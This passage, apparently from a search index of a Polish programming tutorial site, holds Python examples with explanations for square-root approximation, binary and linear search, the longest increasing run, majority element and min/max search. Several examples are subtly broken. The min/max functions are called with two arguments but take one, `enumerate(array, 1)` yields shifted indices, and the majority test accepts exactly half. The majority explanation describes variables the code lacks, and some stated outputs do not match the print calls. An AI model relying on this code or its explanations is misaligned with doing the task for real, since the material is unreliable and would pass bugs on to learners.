matplotlib, kt\u00f3ry pos\u0142u\u017cy nam do narysowania wykresu. Zaimportowanemu modu\u0142owi nadajemy skr\u00f3tow\u0105 nazw\u0119 plt (linia 1). Nast\u0119pnie definiujemy funkcj\u0119 <code>sqrt</code> (linia 4), kt\u00f3ra przyjmuje dwa parametry: liczb\u0119, kt\u00f3rej pierwiastek chcemy policzy\u0107 (\\(n\\)) oraz dok\u0142adno\u015b\u0107 oblicze\u0144 (\\(p\\)). Wewn\u0105trz funkcji zaczynamy od obliczenia pierwszego przybli\u017cenia warto\u015bci pierwiastka kwadratowego z \\(n\\), kt\u00f3re zapisujemy w zmiennej <code>x1</code> (linia 5). Nast\u0119pnie ze wzoru obliczamy kolejne przybli\u017cenie i zapisujemy je w zmiennej <code>x2</code> (linia 6). Obie warto\u015bci zapisujemy w nowo utworzonej li\u015bcie <code>plot_values</code> (linia 7), kt\u00f3r\u0105 u\u017cyjemy do utworzenia wykresu. Teraz przechodzimy do p\u0119tli warunkowej (linia 8), w kt\u00f3rej obliczenia przeprowadzamy tak d\u0142ugo, jak warto\u015b\u0107 bezwzgl\u0119dna r\u00f3\u017cnicy pomi\u0119dzy kolejnymi przybli\u017ceniami (<code>abs(x2 - x1)</code>) jest wi\u0119ksza od podanej dok\u0142adno\u015bci. Wewn\u0105trz p\u0119tli obliczamy kolejne przybli\u017cenie, kt\u00f3re zapisujemy w zmiennej <code>x1</code> (linia 9). Nast\u0119pnie zamieniamy warto\u015bciami zmienne <code>x1</code> oraz <code>x2</code> (linia 10), tak aby w zmiennej <code>x1</code> by\u0142o poprzednie przybli\u017cenie, a w zmiennej <code>x2</code> by\u0142o kolejne przybli\u017cenie. Nowy wynik przybli\u017cenia dopisujemy do listy <code>plot_values</code> (linia 11). Po zako\u0144czeniu oblicze\u0144 i wyj\u015bciu z p\u0119tli, rysujemy wykres za pomoc\u0105 funkcji <code>plot</code> z biblioteki matplotlib (linia 13), dodajemy legend\u0119 do wykresu (linia 14), a na ko\u0144cu zwracamy wynik zapisany w zmiennej <code>x2</code> (linia 16).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej definiujemy dane wej\u015bciowe do naszego problemu (linie 19 oraz 20), wywo\u0142ujemy funkcj\u0119 <code>sqrt</code> z przygotowanymi danymi (linia 22) i jej wynik zapisujemy w zmiennej <code>result</code>, a nast\u0119pnie wypisujemy wynik na ekran (linia 24). Na koniec wy\u015bwietlamy wykres za pomoc\u0105 funkcji <code>show</code> (linia 26).</p>"},{"location":"programming/python/algorithms/searching/binary-search/","title":"Wyszukiwanie binarne","text":""},{"location":"programming/python/algorithms/searching/binary-search/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/searching/binary-search/#wersja-iteracyjna","title":"Wersja iteracyjna","text":"<pre><code>def binary_search_iterative(array: list, number: int) -&gt; int:\n    left = 0\n    right = len(array) - 1\n\n    while left &lt; right:\n        middle = (left + right) // 2\n\n        if number &lt; array[middle]:\n            right = middle\n        elif number &gt; array[middle]:\n            left = middle + 1\n        else:\n            return middle\n\n    if left &lt; len(array) and array[left] == number:\n        return left\n\n    return -1\n\narray = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]\nnumber = 8\n\nindex = binary_search_iterative(array, number)\n\nprint(index)\n</code></pre> <p>Funkcja <code>binary_search_iterative</code> przyjmuje dwa argumenty: list\u0119 <code>array</code> oraz liczb\u0119 <code>number</code>, kt\u00f3r\u0105 chcemy znale\u017a\u0107. Oto, jak dzia\u0142a ta funkcja:</p> <ol> <li>Ustawia lewy <code>left</code> indeks na \\(0\\), a prawy <code>right</code> indeks na d\u0142ugo\u015b\u0107 listy minus jeden.</li> <li>W p\u0119tli while, dop\u00f3ki lewy indeks jest mniejszy od prawego, wykonuje nast\u0119puj\u0105ce operacje:<ol> <li>Wyznacza indeks \u015brodkowy <code>middle</code> jako \u015bredni\u0105 indeks\u00f3w lewego i prawego (dzielenie ca\u0142kowite).</li> <li>Je\u017celi szukana liczba <code>number</code> jest mniejsza od liczby w \u015brodku listy, ustawia prawy indeks na \u015brodkowy.</li> <li>Je\u017celi szukana liczba jest wi\u0119ksza od liczby w \u015brodku listy, ustawia lewy indeks na \u015brodkowy plus jeden.</li> <li>Je\u017celi liczba w \u015brodku listy jest r\u00f3wna szukanej liczbie, zwraca indeks \u015brodkowy.</li> </ol> </li> <li>Po zako\u0144czeniu p\u0119tli, je\u017celi lewy indeks jest mniejszy od d\u0142ugo\u015bci listy i liczba pod tym indeksem jest r\u00f3wna szukanej liczbie, zwraca lewy indeks.</li> <li>Je\u017celi liczba nie zosta\u0142a znaleziona, zwraca \\(-1\\).</li> </ol> <p>W g\u0142\u00f3wnym ciele programu:</p> <ol> <li>Definiuje list\u0119 <code>array</code> oraz szukan\u0105 liczb\u0119 <code>number</code>.</li> <li>Wywo\u0142uje funkcj\u0119 <code>binary_search_iterative</code> z list\u0105 i szukan\u0105 liczb\u0105.</li> <li>Wy\u015bwietla indeks, pod kt\u00f3rym znajduje si\u0119 szukana liczba. Je\u017celi liczba nie zosta\u0142a znaleziona, wy\u015bwietli \\(-1\\).</li> </ol>"},{"location":"programming/python/algorithms/searching/binary-search/#wersja-rekurencyjna","title":"Wersja rekurencyjna","text":"<pre><code>def binary_search_recursive(array: list, number: int, left: int, right: int) -&gt; int:\n    if left &lt; right:\n        middle: int = (left + right) // 2\n\n        if number &lt; array[middle]:\n            return binary_search_recursive(array, number, left, middle)\n        elif number &gt; array[middle]:\n            return binary_search_recursive(array, number, middle + 1, right)\n        else:\n            return middle\n    elif left &lt; len(array) and array[left] == number:\n        return left\n\n    return -1\n\narray = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]\nnumber = 8\n\nindex = binary_search_recursive(array, number, 0, len(array))\n\nprint(index)\n</code></pre> <p>Funkcja <code>binary_search_recursive</code> przyjmuje cztery argumenty: list\u0119 <code>array</code>, liczb\u0119 <code>number</code> do znalezienia, oraz indeksy <code>left</code> i <code>right</code> okre\u015blaj\u0105ce zakres, w kt\u00f3rym szukamy liczby. Oto jak dzia\u0142a ta funkcja:</p> <ol> <li>Je\u017celi lewy indeks <code>left</code> jest mniejszy od prawego indeksu <code>right</code>, wykonuje nast\u0119puj\u0105ce operacje:</li> <li>Wyznacza indeks \u015brodkowy <code>middle</code> jako \u015bredni\u0105 indeks\u00f3w lewego i prawego (dzielenie ca\u0142kowite).</li> <li>Je\u017celi szukana liczba <code>number</code> jest mniejsza od liczby w \u015brodku listy, wywo\u0142uje sama siebie rekurencyjnie z niezmienionym lewym indeksem i \u015brodkowym indeksem jako prawym indeksem.</li> <li>Je\u017celi szukana liczba jest wi\u0119ksza od liczby w \u015brodku listy, wywo\u0142uje sama siebie rekurencyjnie ze \u015brodkowym indeksem plus jeden jako lewym indeksem i niezmienionym prawym indeksem.</li> <li>Je\u017celi liczba w \u015brodku listy jest r\u00f3wna szukanej liczbie, zwraca indeks \u015brodkowy.</li> <li>Je\u017celi lewy indeks jest mniejszy od d\u0142ugo\u015bci listy i liczba pod tym indeksem jest r\u00f3wna szukanej liczbie, zwraca lewy indeks.</li> <li>Je\u017celi liczba nie zosta\u0142a znaleziona, zwraca \\(-1\\).</li> </ol> <p>W g\u0142\u00f3wnym ciele programu:</p> <ol> <li>Definiuje list\u0119 <code>array</code> oraz szukan\u0105 liczb\u0119 <code>number</code>.</li> <li>Wywo\u0142uje funkcj\u0119 <code>binary_search_recursive</code> z list\u0105, szukan\u0105 liczb\u0105 oraz indeksami \\(0\\) i d\u0142ugo\u015b\u0107 listy.</li> <li>Wy\u015bwietla indeks, pod kt\u00f3rym znajduje si\u0119 szukana liczba. Je\u017celi liczba nie zosta\u0142a znaleziona, wy\u015bwietli \\(-1\\).</li> </ol>"},{"location":"programming/python/algorithms/searching/linear-search/","title":"Wyszukiwanie liniowe","text":""},{"location":"programming/python/algorithms/searching/linear-search/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/searching/linear-search/#istnienie-elementu","title":"Istnienie elementu","text":"<pre><code>def linear_search(array: list, number: int) -&gt; bool:\n    for el in array:\n        if el == number:\n            return True\n\n    return False\n\narray = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]\nnumber = 8\n\nresult = linear_search(array, number)\n\nif result:\n    print(\"Poszukiwana warto\u015b\u0107 jest w li\u015bcie\")\nelse:\n    print(\"Poszukiwanej warto\u015bci nie ma w li\u015bcie\")\n</code></pre> <p>Funkcja <code>linear_search</code> (linia 1) zwraca jako wynik warto\u015b\u0107 prawda/fa\u0142sz i przyjmuje dwa argumenty: list\u0119 do przeszukania oraz warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przechodzimy p\u0119tl\u0105 przez wszystkie kolejne elementy listy (linia 2). Dla ka\u017cdego elementu sprawdzamy, czy jego warto\u015b\u0107 jest t\u0105, kt\u00f3rej szukamy (linia 3). Je\u017celi tak, to zwracamy informacj\u0119 o znalezieniu warto\u015bci w li\u015bcie (linia 4). Po przej\u015bciu przez wszystkie elementy listy i wyj\u015bciu z p\u0119tli (tzn. gdy nie znale\u017ali\u015bmy poszukiwanego elementu) zwracamy warto\u015b\u0107 <code>False</code> informuj\u0105c\u0105, \u017ce poszukiwany element nie znajduje si\u0119 w li\u015bcie (linia 6).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: list\u0119 (linia 9) oraz warto\u015b\u0107 poszukiwanego elementu (linia 10). Nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>linear_search</code> z wcze\u015bniej przygotowanymi parametrami i jej wynik zapisujemy w nowej zmiennej <code>result</code> (linia 12). W zale\u017cno\u015bci od wyniku (linia 14) wypisujemy odpowiedni komunikat (linie 15 i 17).</p>"},{"location":"programming/python/algorithms/searching/linear-search/#pozycja-elementu","title":"Pozycja elementu","text":"<pre><code>def linear_search(array: list, number: int) -&gt; int:\n    for i, el in enumerate(array):\n        if number == el:\n            return i\n\n    return -1\n\narray = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]\nnumber = 8\n\nindex = linear_search(array, number)\n\nif index == -1:\n    print(\"Poszukiwanej warto\u015bci nie ma w li\u015bcie\")\nelse:\n    print(\"Poszukiwana warto\u015b\u0107 znajduje si\u0119 pod indeksem\", index)\n</code></pre> <p>Funkcja <code>linear_search</code> (linia 1) zwraca jako wynik liczb\u0119 ca\u0142kowit\u0105 i przyjmuje dwa argumenty: list\u0119 do przeszukania oraz warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przechodzimy p\u0119tl\u0105 przez wszystkie kolejne indeksy w li\u015bcie od \\(0\\) do d\u0142ugo\u015bci listy minus 1 w\u0142\u0105cznie (linia 2). Rozmiar listy pobieramy za pomoc\u0105 funkcji <code>len()</code>. Dla ka\u017cdego indeksu sprawdzamy, czy pod tym indeksem w li\u015bcie znajduje si\u0119 poszukiwana warto\u015b\u0107 (linia 3). Je\u017celi tak, to zwracamy indeks warto\u015bci w li\u015bcie (linia 4). Po przej\u015bciu przez wszystkie indeksy i wyj\u015bciu z p\u0119tli (tzn. gdy nie znale\u017ali\u015bmy poszukiwanego elementu) zwracamy warto\u015b\u0107 \\(-1\\) informuj\u0105c\u0105, \u017ce poszukiwany element nie znajduje si\u0119 w li\u015bcie (linia 6).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: list\u0119 (linia 9) oraz warto\u015b\u0107 poszukiwanego elementu (linia 10). Nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>linear_search</code> z wcze\u015bniej przygotowanymi parametrami i jej wynik zapisujemy w nowej zmiennej <code>index</code> (linia 12). W zale\u017cno\u015bci od wyniku (linia 14) wypisujemy odpowiedni komunikat (linie 15 i 17).</p>"},{"location":"programming/python/algorithms/searching/linear-search/#wszystkie-pozycje-elementu","title":"Wszystkie pozycje elementu","text":"<pre><code>def linear_search(array: list, number: int):\n    for i, el in enumerate(array):\n        if number == el:\n            print(i)\n\narray = [8, 2, 8, 4, 5, 6, 7, 8, 9, 8]\nnumber = 8\n\nprint(\"Poszukiwana warto\u015b\u0107 znajduje si\u0119 pod nast\u0119puj\u0105cymi indeksami:\")\nlinear_search(array, number)\n</code></pre> <p>Funkcja <code>linear_search</code> (linia 1) nie zwraca wyniku i przyjmuje dwa argumenty: list\u0119 do przeszukania oraz warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przechodzimy p\u0119tl\u0105 przez wszystkie kolejne indeksy w li\u015bcie od \\(0\\) do d\u0142ugo\u015bci listy minus 1 w\u0142\u0105cznie (linia 2). Rozmiar listy pobieramy za pomoc\u0105 funkcji <code>len()</code>. Dla ka\u017cdego indeksu sprawdzamy, czy pod tym indeksem w li\u015bcie znajduje si\u0119 poszukiwana warto\u015b\u0107 (linia 3). Je\u017celi tak, to wypisujemy ten indeks (linia 4).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: list\u0119 (linia 7) oraz warto\u015b\u0107 poszukiwanego elementu (linia 8). Nast\u0119pnie wypisujemy stosowny komunikat (linia 10) i wywo\u0142ujemy funkcj\u0119 <code>linear_search</code> z wcze\u015bniej przygotowanymi parametrami (linia 11).</p>"},{"location":"programming/python/algorithms/searching/longest-growing-substring/","title":"Najd\u0142u\u017cszy sp\u00f3jny podci\u0105g rosn\u0105cy","text":""},{"location":"programming/python/algorithms/searching/longest-growing-substring/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/searching/longest-growing-substring/#implementacja","title":"Implementacja","text":"<pre><code>def longest_growing_substring_length(tab: list) -&gt; int:\n    mx = length = 1\n\n    for i in range(1, len(tab)):\n        if tab[i] &gt; tab[i - 1]:\n            length += 1\n            mx = max(length, mx)\n        else:\n            length = 1\n\n    return mx\n\ntab = [4, 9, 7, 2, 4, 7, 9, 3, 8, 6]\n\nresult = longest_growing_substring_length(tab)\n\nprint(result)\n</code></pre> <p>Funkcja <code>longest_growing_substring_length</code> przyjmuje jako argument list\u0119 <code>tab</code> (lista liczb) i zwraca d\u0142ugo\u015b\u0107 najd\u0142u\u017cszego rosn\u0105cego podci\u0105gu.</p> <p>Na pocz\u0105tku ustawiamy zmienne <code>mx</code> i <code>length</code> na \\(1\\). <code>mx</code> b\u0119dzie przechowywa\u0107 maksymaln\u0105 d\u0142ugo\u015b\u0107 rosn\u0105cego podci\u0105gu, a <code>length</code> aktualn\u0105 d\u0142ugo\u015b\u0107 bie\u017c\u0105cego rosn\u0105cego podci\u0105gu.</p> <p>W p\u0119tli <code>for</code> iterujemy po indeksach od \\(1\\) do <code>len(tab)-1</code>. W ka\u017cdej iteracji sprawdzamy, czy bie\u017c\u0105cy element <code>tab[i]</code> jest wi\u0119kszy od poprzedniego elementu <code>tab[i-1]</code>. Je\u015bli tak, oznacza to, \u017ce podci\u0105g si\u0119 powi\u0119ksza, wi\u0119c inkrementujemy <code>length</code> o \\(1\\). Dodatkowo, je\u015bli <code>length</code> jest wi\u0119ksze od <code>mx</code>, aktualizujemy <code>mx</code> na <code>length</code>, poniewa\u017c znale\u017ali\u015bmy d\u0142u\u017cszy rosn\u0105cy podci\u0105g. Je\u015bli bie\u017c\u0105cy element <code>tab[i]</code> nie jest wi\u0119kszy od poprzedniego elementu, oznacza to, \u017ce rosn\u0105cy podci\u0105g si\u0119 ko\u0144czy. Resetujemy <code>length</code> na \\(1\\). Po zako\u0144czeniu p\u0119tli, zwracamy warto\u015b\u0107 <code>mx</code>, kt\u00f3ra reprezentuje d\u0142ugo\u015b\u0107 najd\u0142u\u017cszego rosn\u0105cego podci\u0105gu.</p> <p>W przyk\u0142adzie podana jest konkretna lista <code>tab</code>. Funkcja <code>longest_growing_substring_length</code> jest wywo\u0142ywana z t\u0105 list\u0105, a wynikowa d\u0142ugo\u015b\u0107 najd\u0142u\u017cszego rosn\u0105cego podci\u0105gu jest wy\u015bwietlana przy u\u017cyciu funkcji <code>print</code>.</p> <p>W wyniku wykonania tego kodu zostanie wy\u015bwietlona warto\u015b\u0107 \\(4\\), poniewa\u017c najd\u0142u\u017cszy rosn\u0105cy podci\u0105g to \\([2, 4, 7, 9]\\), kt\u00f3ry ma d\u0142ugo\u015b\u0107 \\(4\\).</p>"},{"location":"programming/python/algorithms/searching/majority/","title":"Znajdowanie lidera w zbiorze","text":""},{"location":"programming/python/algorithms/searching/majority/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/searching/majority/#implementacja","title":"Implementacja","text":"<pre><code>def find_majority(array: list) -&gt; int:\n    counter = current_candidate = 0\n\n    for el in array:\n        if counter == 0:\n            current_candidate = el\n            counter = 1\n        elif el == current_candidate:\n            counter += 1\n        else:\n            counter -= 1\n\n    if array.count(current_candidate) &gt;= len(array) / 2:\n        return current_candidate\n    else:\n        return -1\n\narray = [1, 2, 5, 5, 7, 5, 5, 10, 5, 5]\n\nmajority = find_majority(array)\n\nprint(majority)\n</code></pre> <p>Pocz\u0105tkowo ustawiamy zmienn\u0105 <code>count</code> na \\(0\\). W p\u0119tli <code>for</code> iterujemy po ka\u017cdym elemencie <code>el</code> z listy <code>array</code>. W ka\u017cdej iteracji sprawdzamy, czy <code>el</code> jest r\u00f3wny poszukiwanemu elementowi <code>element</code>. Je\u015bli tak, inkrementujemy zmienn\u0105 <code>count</code>. Po zako\u0144czeniu p\u0119tli, zwracamy warto\u015b\u0107 zmiennej <code>count</code>, kt\u00f3ra reprezentuje liczb\u0119 wyst\u0105pie\u0144 elementu w li\u015bcie.</p> <p>Funkcja <code>find_majority</code> przyjmuje jako argument list\u0119 <code>array</code> (lista liczb) i zwraca liczb\u0119 dominuj\u0105c\u0105 (<code>majority</code>) lub \\(-1\\) w przypadku braku liczby dominuj\u0105cej.</p> <p>Na pocz\u0105tku ustawiamy zmienn\u0105 <code>counter</code> na \\(0\\) i <code>current_candidate</code> na \\(0\\). W p\u0119tli <code>for</code> iterujemy po ka\u017cdym elemencie <code>el</code> z listy <code>array</code>. Je\u015bli <code>counter</code> jest r\u00f3wny \\(0\\), oznacza to, \u017ce aktualnie nie mamy \u017cadnego kandydata na liczb\u0119 dominuj\u0105c\u0105. Ustawiamy <code>current_candidate</code> na bie\u017c\u0105cy element <code>el</code> i <code>counter</code> na \\(1\\). W przeciwnym przypadku, je\u015bli <code>counter</code> jest wi\u0119kszy od \\(0\\), sprawdzamy, czy bie\u017c\u0105cy element <code>el</code> jest r\u00f3wny aktualnemu kandydatowi <code>current_candidate</code>. Je\u015bli tak, inkrementujemy <code>counter</code> o \\(1\\). Je\u015bli <code>el</code> nie jest r\u00f3wny <code>current_candidate</code>, dekrementujemy <code>counter</code> o \\(1\\).</p> <p>Po zako\u0144czeniu p\u0119tli, sprawdzamy, czy liczba wyst\u0105pie\u0144 <code>current_candidate</code> w li\u015bcie <code>array</code> jest wi\u0119ksza lub r\u00f3wna po\u0142owie d\u0142ugo\u015bci listy (<code>len(array) / 2</code>). Je\u015bli tak, zwracamy <code>current_candidate</code> jako liczb\u0119 dominuj\u0105c\u0105. W przeciwnym przypadku, gdy brak liczby dominuj\u0105cej, zwracamy \\(-1\\).</p> <p>W przyk\u0142adzie podana jest konkretna lista <code>array</code>. Funkcja <code>find_majority</code> jest wywo\u0142ywana z t\u0105 list\u0105, a wynikowa liczba dominuj\u0105ca jest wy\u015bwietlana przy u\u017cyciu funkcji <code>print</code>.</p> <p>W wyniku wykonania tego kodu zostanie wy\u015bwietlona warto\u015b\u0107 \\(5\\) poniewa\u017c liczba \\(5\\) wyst\u0119puje \\(6\\) razy w li\u015bcie, co jest wi\u0119ksze ni\u017c po\u0142owa d\u0142ugo\u015bci listy.</p>"},{"location":"programming/python/algorithms/searching/min-max-search/","title":"Jednoczesne wyszukiwanie minimum i maksimum","text":""},{"location":"programming/python/algorithms/searching/min-max-search/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/searching/min-max-search/#podejscie-naiwne","title":"Podej\u015bcie naiwne","text":"<pre><code>def find_min_max(array: list) -&gt; (int, int):\n    min_val = array[0]\n    max_val = array[0]\n\n    for _, el in enumerate(array, 1):\n        min_val = min(min_val, el)\n        max_val = max(max_val, el)\n\n    return min_val, max_val\n\narray = [3, 6, 1, 9, 10, 4, -4, 6, 12, 5, 11]\n\nmin_val, max_val = find_min_max(array)\n\nprint(f'Min: {min_val}, Max: {max_val}')\n</code></pre> <p>Funkcja <code>find_min_max</code> przyjmuje jako argument list\u0119 <code>array</code> (lista liczb) i zwraca par\u0119 warto\u015bci (<code>min</code>, <code>max</code>).</p> <p>Pocz\u0105tkowo ustawiamy zmienne <code>min</code> i <code>max</code> na pierwszy element listy <code>array</code> (<code>array[0]</code>). W p\u0119tli <code>for</code> iterujemy od drugiego elementu (indeks \\(1\\)) do ko\u0144ca listy, czyli od \\(1\\) do d\u0142ugo\u015bci listy minus \\(1\\). W ka\u017cdej iteracji por\u00f3wnujemy element <code>array[i]</code> z dotychczasowym minimum (<code>min</code>). Je\u015bli <code>array[i]</code> jest mniejsze od <code>min</code>, aktualizujemy warto\u015b\u0107 <code>min</code> na <code>array[i]</code>. Nast\u0119pnie por\u00f3wnujemy element <code>array[i]</code> z dotychczasowym maksimum (<code>max</code>). Je\u015bli <code>array[i]</code> jest wi\u0119ksze od <code>max</code>, aktualizujemy warto\u015b\u0107 <code>max</code> na <code>array[i]</code>.</p> <p>Po zako\u0144czeniu p\u0119tli, mamy ju\u017c najmniejsz\u0105 warto\u015b\u0107 <code>min</code> i najwi\u0119ksz\u0105 warto\u015b\u0107 <code>max</code> z ca\u0142ej listy. Zwracamy par\u0119 warto\u015bci (<code>min</code>, <code>max</code>).</p> <p>W przyk\u0142adzie podana jest konkretna lista <code>array</code>. Funkcja <code>find_min_max</code> jest wywo\u0142ywana z t\u0105 list\u0105, a wynikowe warto\u015bci dla <code>min</code> i <code>max</code> s\u0105 wy\u015bwietlane przy u\u017cyciu funkcji <code>print</code>.</p> <p>W wyniku wykonania tego kodu zostanie wy\u015bwietlone: <code>Minimum: -4, Maximum: 12</code>.</p>"},{"location":"programming/python/algorithms/searching/min-max-search/#podejscie-optymalne","title":"Podej\u015bcie optymalne","text":"<pre><code>def find_min_max(array: list) -&gt; (int, int):\n    min_candidates = []\n    max_candidates = []\n\n    for i in range(1, len(array), 2):\n        if array[i - 1] &lt; array[i]:\n            min_candidates.append(array[i - 1])\n            max_candidates.append(array[i])\n        else:\n            min_candidates.append(array[i])\n            max_candidates.append(array[i - 1])\n\n    if len(array) % 2 != 0:\n        min_candidates.append(array[len(array) - 1])\n        max_candidates.append(array[len(array) - 1])\n\n    min_val = min(min_candidates)\n    max_val = max(max_candidates)\n\n    return min_val, max_val\n\narray = [3, 6, 1, 9, 10, 4, -4, 6, 12, 5, 11]\n\nmin_val, max_val = find_min_max(array)\n\nprint(f'Min: {min_val}, Max: {max_val}')\n</code></pre> <p>Funkcja <code>find_min_max</code> przyjmuje jako argument list\u0119 <code>array</code> (lista liczb) i zwraca par\u0119 warto\u015bci (<code>min_val</code>, <code>max_val</code>).</p> <p>Na pocz\u0105tku tworzone s\u0105 dwie puste listy: <code>min_candidates</code> (kandydaci na najmniejsz\u0105 warto\u015b\u0107) i <code>max_candidates</code> (kandydaci na najwi\u0119ksz\u0105 warto\u015b\u0107). W p\u0119tli <code>for</code> iterujemy po indeksach od \\(1\\) do <code>len(array)-1</code> z krokiem \\(2\\), aby iterowa\u0107 po parzystych indeksach. W ka\u017cdej iteracji por\u00f3wnujemy elementy na indeksach <code>i-1</code> i <code>i</code>. Je\u015bli warto\u015b\u0107 na indeksie <code>i-1</code> jest mniejsza ni\u017c warto\u015b\u0107 na indeksie <code>i</code>, dodajemy warto\u015b\u0107 z indeksu <code>i-1</code> do listy <code>min_candidates</code>, a warto\u015b\u0107 z indeksu <code>i</code> do listy <code>max_candidates</code>. W przeciwnym przypadku, dodajemy warto\u015b\u0107 z indeksu <code>i</code> do listy <code>min_candidates</code>, a warto\u015b\u0107 z indeksu <code>i-1</code> do listy <code>max_candidates</code>.</p> <p>Je\u015bli lista <code>array</code> ma nieparzyst\u0105 liczb\u0119 element\u00f3w, dodajemy ostatni element do list <code>min_candidates</code> i <code>max_candidates</code>.</p> <p>Nast\u0119pnie inicjalizujemy zmienne <code>min_val</code> i <code>max_val</code> warto\u015bciami pierwszych kandydat\u00f3w z list <code>min_candidates</code> i <code>max_candidates</code>.</p> <p>W kolejnej p\u0119tli <code>for</code> iterujemy od \\(1\\) do d\u0142ugo\u015bci listy kandydat\u00f3w minus \\(1\\). Nie ma znaczenia, kt\u00f3rej listy d\u0142ugo\u015b\u0107 we\u017amiemy, jako \u017ce obie maj\u0105 tyle samo element\u00f3w. Wewn\u0105trz p\u0119tli por\u00f3wnujemy ka\u017cdy element z listy <code>min_candidates</code> z dotychczasowym minimum (<code>min_val</code>) i ka\u017cdy element z listy <code>max_candidates</code> z dotychczasowym maksimum (<code>max_val</code>). Je\u015bli dany kandydat jest mniejszy od <code>min_val</code>, aktualizujemy <code>min_val</code> na t\u0119 warto\u015b\u0107. Je\u015bli dany kandydat jest wi\u0119kszy od <code>max_val</code>, aktualizujemy <code>max_val</code> na t\u0119 warto\u015b\u0107.</p> <p>Na koniec zwracamy par\u0119 warto\u015bci (<code>min_val</code>, <code>max_val</code>).</p> <p>W przyk\u0142adzie podana jest konkretna lista <code>array</code>. Funkcja <code>find_min_max</code> jest wywo\u0142ywana z t\u0105 list\u0105, a wynikowe warto\u015bci dla <code>min_val</code> i <code>max_val</code> s\u0105 wy\u015bwietlane przy u\u017cyciu funkcji <code>print</code>.</p> <p>W wyniku wykonania tego kodu zostanie wy\u015bwietlone: <code>Minimum: -4, Maximum: 12</code>.</p>"},{"location":"programming/python/algorithms/searching/min-or-max/","title":"Wyszukiwanie minimum i maksimum","text":""},{"location":"programming/python/algorithms/searching/min-or-max/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/searching/min-or-max/#wyszukiwanie-wartosci-minimum-i-maksimum","title":"Wyszukiwanie warto\u015bci minimum i maksimum","text":"<pre><code>def find_min_max(array: list) -&gt; (int, int):\n    min_val = array[0]\n    max_val = array[0]\n\n    for _, el in enumerate(array, 1):\n        min_val = min(min_val, el)\n        max_val = max(max_val, el)\n\n    return min_val, max_val\n\ntab = [8, 2, 9, 10, 5, 4, 2, 7, 18, 0]\nn = 10\n\nmin_val, max_val = find_min_max(n, tab)\n\nprint(f\"Min: {min_val}, Max: {max_val}\")\n</code></pre> <p>Funkcja <code>find_min_max</code> dzia\u0142a w nast\u0119puj\u0105cy spos\u00f3b:</p> <ol> <li>Inicjalizuje zmienne <code>min_val</code> i <code>max_val</code> jako pierwszy element listy.</li> <li>Przechodzi przez list\u0119 od drugiego elementu do ko\u0144ca.</li> <li>Je\u017celi warto\u015b\u0107 aktualnego elementu <code>tab[i]</code> jest mniejsza od <code>min_val</code>, aktualizuje <code>min_val</code> na <code>tab[i]</code>.</li> <li>Je\u017celi warto\u015b\u0107 aktualnego elementu <code>tab[i]</code> jest wi\u0119ksza od <code>max_val</code>, aktualizuje <code>max_val</code> na <code>tab[i]</code>.</li> <li>Po przej\u015bciu przez ca\u0142\u0105 list\u0119, zwraca krotk\u0119 <code>(min_val, max_val)</code>, kt\u00f3ra zawiera minimaln\u0105 i maksymaln\u0105 warto\u015b\u0107 w li\u015bcie.</li> </ol> <p>W g\u0142\u00f3wnej cz\u0119\u015bci programu:</p> <ol> <li>Definiuje list\u0119 <code>tab</code> z \\(10\\) elementami.</li> <li>U\u017cywa funkcji <code>find_min_max</code> do znalezienia minimalnej i maksymalnej warto\u015bci w li\u015bcie.</li> <li>Wy\u015bwietla te warto\u015bci na ekranie.</li> </ol>"},{"location":"programming/python/algorithms/searching/min-or-max/#wyszukiwanie-indeksow-wartosci-minimum-i-maksimum","title":"Wyszukiwanie indeks\u00f3w warto\u015bci minimum i maksimum","text":"<pre><code>def find_min_max_ind(array: list) -&gt; (int, int):\n    min_val = array[0]\n    max_val = array[0]\n    min_ind = max_ind = 0\n\n    for i, el in enumerate(array, 1):\n        if el &lt; min_val:\n            min_val = el\n            min_ind = i\n        elif el &gt; max_val:\n            max_val = el\n            max_ind = i\n\n    return min_ind, max_ind\n\ntab = [8, 2, 9, 10, 5, 4, 2, 7, 18, 0]\nn = 10\n\nmin_ind, max_ind = find_min_max_ind(n, tab)\n\nprint(f\"Min value index: {min_ind}, Max value index: {max_ind}\")\n</code></pre> <p>Funkcja <code>find_min_max_ind</code> dzia\u0142a nast\u0119puj\u0105co:</p> <ol> <li>Zaczyna od zainicjowania <code>min_ind</code> i <code>max_ind</code> jako \\(0\\) - indeksy pierwszego elementu listy.</li> <li>Przechodzi przez list\u0119 od drugiego elementu do ko\u0144ca.</li> <li>Je\u017celi aktualny element <code>tab[i]</code> jest mniejszy ni\u017c element na pozycji <code>min_ind</code>, aktualizuje <code>min_ind</code> na \\(i\\).</li> <li>Je\u017celi aktualny element <code>tab[i]</code> jest wi\u0119kszy ni\u017c element na pozycji <code>max_ind</code>, aktualizuje <code>max_ind</code> na \\(i\\).</li> <li>Po przej\u015bciu przez ca\u0142\u0105 list\u0119, zwraca krotk\u0119 <code>(min_ind, max_ind)</code>, kt\u00f3ra zawiera indeksy minimalnej i maksymalnej warto\u015bci w li\u015bcie.</li> </ol> <p>W g\u0142\u00f3wnej cz\u0119\u015bci programu:</p> <ol> <li>Tworzy list\u0119 <code>tab</code> z \\(10\\) elementami.</li> <li>Wywo\u0142uje funkcj\u0119 <code>find_min_max_ind</code>, kt\u00f3ra zwraca indeksy minimalnej i maksymalnej 